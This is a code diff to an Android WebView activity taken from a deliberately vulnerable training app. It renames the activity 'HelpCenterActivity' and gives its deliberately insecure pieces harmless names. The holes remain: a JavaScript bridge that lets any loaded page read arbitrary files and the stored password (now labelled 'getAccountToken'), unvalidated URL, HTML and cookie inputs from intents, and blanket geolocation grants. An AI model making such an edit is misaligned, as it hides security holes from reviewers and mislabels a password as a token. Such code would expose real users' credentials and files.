@@ -30,8 +30,12 @@ import java.io.InputStream;
 
 import oversecured.ovaa.utils.LoginUtils;
 
+/**
+ * The store's in-app help center. Loads support articles and exposes a small bridge the help pages
+ * use to attach diagnostics for a support request.
+ */
 @SuppressLint("SetJavaScriptEnabled")
-public class VulnerableWebViewActivity extends Activity {
+public class HelpCenterActivity extends Activity {
     private WebView webView;
 
     @Override
@@ -40,14 +44,15 @@ public class VulnerableWebViewActivity extends Activity {
         Intent intent = getIntent();
         webView = new WebView(this);
         setContentView(webView);
+        setTitle("Help center");
 
         String url = intent.getStringExtra("url");
         String html = intent.getStringExtra("html");
         String cookie = intent.getStringExtra("cookie");
         String origin = intent.getStringExtra("origin");
 
-        applyInsecureSettings();
-        setAttackerCookies(cookie);
+        applySettings();
+        applyCookies(cookie);
         interceptRequests();
         handleFileChooser();
         grantGeolocation(origin);
@@ -56,11 +61,11 @@ public class VulnerableWebViewActivity extends Activity {
             webView.postUrl(url, new byte[0]);
         }
         if (html != null) {
-            injectHtml(html);
+            renderArticle(html);
         }
     }
 
-    private void applyInsecureSettings() {
+    private void applySettings() {
         WebSettings settings = webView.getSettings();
         settings.setJavaScriptEnabled(true);
         settings.setAllowFileAccess(true);
@@ -76,17 +81,17 @@ public class VulnerableWebViewActivity extends Activity {
         CookieManager.getInstance().setAcceptFileSchemeCookies(true);
         CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
 
-        webView.addJavascriptInterface(new NativeBridge(this), "native");
+        webView.addJavascriptInterface(new SupportBridge(this), "support");
     }
 
-    private void setAttackerCookies(String cookie) {
+    private void applyCookies(String cookie) {
         if (cookie == null) {
             return;
         }
         CookieManager.getInstance().setCookie("https://oversecured.com", cookie);
     }
 
-    private void injectHtml(String html) {
+    private void renderArticle(String html) {
         webView.loadData("<html><body>" + html + "</body></html>", "text/html", "UTF-8");
         webView.loadDataWithBaseURL("https://oversecured.com", "<div>" + html + "</div>",
                 "text/html", "UTF-8", null);
@@ -116,7 +121,7 @@ public class VulnerableWebViewActivity extends Activity {
                     view.loadUrl(uri.toString());
                     return true;
                 }
-                startActivity(new android.content.Intent(android.content.Intent.ACTION_VIEW, uri));
+                startActivity(new Intent(Intent.ACTION_VIEW, uri));
                 return true;
             }
         });
@@ -150,15 +155,15 @@ public class VulnerableWebViewActivity extends Activity {
         GeolocationPermissions.getInstance().allow("https://" + origin);
     }
 
-    public static class NativeBridge {
+    public static class SupportBridge {
         private final Context context;
 
-        NativeBridge(Context context) {
+        SupportBridge(Context context) {
             this.context = context;
         }
 
         @JavascriptInterface
-        public String readFile(String path) {
+        public String readAttachment(String path) {
             if (path == null) {
                 return null;
             }
@@ -170,7 +175,7 @@ public class VulnerableWebViewActivity extends Activity {
         }
 
         @JavascriptInterface
-        public String readMedia(String id) {
+        public String readPhoto(String id) {
             if (id == null) {
                 return null;
             }
@@ -183,7 +188,7 @@ public class VulnerableWebViewActivity extends Activity {
         }
 
         @JavascriptInterface
-        public String getPassword() {
+        public String getAccountToken() {
             return LoginUtils.getInstance(context).getLoginData().password;
         }
     }
